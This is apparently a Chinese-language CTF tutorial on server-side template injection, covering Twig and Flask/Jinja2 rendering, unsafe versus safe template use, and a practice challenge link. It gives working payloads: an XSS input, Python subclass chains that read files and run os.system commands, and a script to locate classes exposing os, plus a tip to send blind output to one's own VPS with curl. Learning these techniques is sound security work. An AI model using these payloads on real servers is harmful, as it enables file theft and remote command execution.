# SSTI基础

SSTI:Server Side Template Injection，服务端模板注入。

因为作者也是首次学习此知识点，所有讲解可能会有些啰嗦，教程大概没有了解过模板的开发方式和模板注入的同学也可以听懂。  

主要内容：

+ 模板是什么

+ 模板注入原理

+ Flask的介绍和利用

更新了一些题目，可供练手用。

## 原理

### 模板是什么

模板可以理解为一段固定好格式，等着你来填充信息的文件。通过这种方法，可以做到逻辑与视图分离，更容易、清楚且相对安全地编写前后端不同的逻辑。作为对比，一个很不好的解决方法是用脚本语言的字符串拼接html，然后统一输出。  

这是一个模板的例子：  

```html
<!--login.tpl-->
<html>
    <head>
        <title>{{title}}</title>
    </head>
    <body>
        <form method="{{method}}",action={{action}}>
            <input type="text" name="user" value="{{username}}">
        </form>
        <p>
            This page took {{microtime(true) - time}} seconds to render.
        </p>
    </body>
</html>
```

对应的后端代码逻辑可以是:  

```php
$templateEngine = new TemplateEngine();
$tpl = $templateEngine->loadFile(login.tpl);
$tpl->assign('title','Login');
$tpl->assign('method','post');
$tpl->assign('action','login.php');
$tpl->assign('username',getUserNameFromCookie());
$tpl->assign('time',microtime(true));
$tmp->show();
```

### 模板注入基本原理

如果用户输入作为【模板当中变量  的值】，模板引擎一般会对用户输入进行编码转义，不容易造成XSS攻击。

```php
<?php
    require_once(dirname(__FILE__).'/../lib/Twig/Autoloader.php');
    Twig_Autoloader::register(true);
    $twig = new Twig_Environment(new Twig_Loader_String());
    $output = $twig->render("Hello {{name}}", array("name" =>$_GET["name"]));  // 将用户输入作为模版变量的值
    echo $output;
?>
```

这段代码输入`<script>alert(1)</script>`会原样输出，因为进行了HTML实体编码。  

但是如果用户输入作为了【模板内容  的一部分】，用户输入会原样输出。

```php
<?php
    require_once(dirname(__FILE__).'/../lib/Twig/Autoloader.php');
    Twig_Autoloader::register(true);
    $twig = new Twig_Environment(new Twig_Loader_String());
    $output = $twig->render("Hello {$_GET['name']}"); // 将用户输入作为模版内容的一部分
    echo $output;
?>
```

这段代码输入`&lt;script&gt;alert(1)&lt;/script&gt;`会造成XSS漏洞。  

如果输入`Vuln{%23 comment %23}{{2*8}}`，会执行2*8这个语句，输出`Hello Vuln16`。因为经过渲染后，模板变成了`Hello Vuln{# comment #}{{2\*8}}`。  

不同的模板会有不同的语法，一般使用Detect-Identify-Expoit的利用流程。

### 识别不同模板

![](https://upload-images.jianshu.io/upload_images/19782504-e73756ae84d4d5a4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

## 模板基础与利用方法

### A.Python-Flask

**它使用Jinja2作为渲染引擎**

[Jinja2.10.x Documention](https://jinja.palletsprojects.com/en/2.10.x/templates/)

#### a.路由

通过@的注解方式，将资源和函数对应起来。

```python
from flask import flask 
@app.route('/index/')
def hello_word():
    return 'hello word'
```

app.route装饰器作用是把函数和URL绑定。  

也就是说，访问`http://host:port/index`的时候，flask会返回`HelloWorld`。  

#### b.渲染

渲染的方法有`render_template`和`render_template_string`两种。  

render_template()是用来渲染一个指定的文件的  

```python
return render_template('index.html')
```

render_template_string则是用来渲染一个字符串的

```python
html = '<h1>This is index page</h1>'
return render_template_string(html)
```

#### c.模板使用

文件结构：在网站根目录下新建`templates`文件夹，存放html的模板文件。

Flask使用Jinja2这个渲染引擎，它是以`{{}}`作为变量包裹的标识符。同时，这个符号包裹内还可以执行一些简单的表达式。

模板的使用：示例

```html
<!--/templates/index.html-->
<h1>{{content}}</h1>
```

```python
#test.py
from flask import *
@app.route('/index/')
def user_login():
    return render_template('index.html',content='This is index page.')
```

模板的不安全使用：示例

```python
@app.route('/test/')
def test():
    code = request.args.get('id')
    html = '''
        <h3>%s</h3>
    '''%(code)
    return render_template_string(html)
```

这里直接将用户输入作为了模板，不会经过转义和过滤的步骤，很容易XSS。  

模板的安全使用：示例

```python
@app.route('/test/')
def test():
    code = request.args.get('id')
    return render_template_string('<h1>{{ code }}</h1>',code=code)
```

模板引擎会对输入变量进行编码转义。  

#### d.利用方法

首先，Flask中有一些全局变量，例如：

```
{{config}}
{{requests.environ}}
```

主要是通过Python对象的继承，用魔术方法一步步找到可利用的方法去执行。即找到父类`<type 'object'>`–>寻找子类–>找关于命令执行或者文件操作的模块。  

对象的魔术方法：

```
__class__  返回类型所属的对象
__mro__    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。
__base__   返回该对象所继承的基类
// __base__和__mro__都是用来寻找基类的

__subclasses__   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表
__init__  类的初始化方法
__globals__  对包含函数全局变量的字典的引用
```

下面简单解释一下利用过程

##### 文件读取

```python
#获取''字符串的所属对象
>>> ''.__class__
<class 'str'>

#获取str类的父类
>>> ''.__class__.__mro__
(<class 'str'>, <class 'object'>)

#获取object类的所有子类
>>> ''.__class__.__mro__[1].__subclasses__()
[<class 'type'>, <class 'weakref'>, <class 'weakcallableproxy'>, <class 'weakproxy'>, <class 'int'>, <class 'bytearray'>, <class 'bytes'>, <class 'list'>, <class 'NoneType'>, <class 'NotImplementedType'>, <class 'traceback'>, <class 'super'>...
#有很多类，后面省略
```

现在只需要从这些类中寻找需要的类，用数组下标获取，然后执行该类中想要执行的函数即可。比如第41个类是file类，就可以构造利用：

```python
''.__class__.__mro__[2].__subclasses__()[40]('<File_To_Read>').read()
```

再比如，如果没有file类，使用类`<class '_frozen_importlib_external.FileLoader'>`，可以进行文件的读取。这里是第91个类。

```python
''.__class__.__mro__[2].__subclasses__()[91].get_data(0,"<file_To_Read>")
```

##### 命令执行

首先通过脚本找到包含os模块的类。

```python
num = 0
for item in ''.__class__.__mro__[1].__subclasses__():
    try:
         if 'os' in item.__init__.__globals__:
             print (num,item)
         num+=1
    except:
        print ('-')
        num+=1
```

假设输出为x编号的类，则可以构造  

```python
''.__class__.__mro__[1].__subclasses__()[x].__init__.__globals__['os'].system('ls')
```

命令执行的结果如果不能直接看到，可以考虑通过curl工具发送到自己的VPS，或者使用CEYE平台。

执行脚本发现，包含os模块的类： 

```
<class 'site._Printer'>
<class 'site.Quitter'>
```

其他函数的利用同理。

#### e.练习题目

[攻防世界:Web_python_template_injection](https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=5408&page=2) ，Flask模板注入板子题，上述知识即可解决。
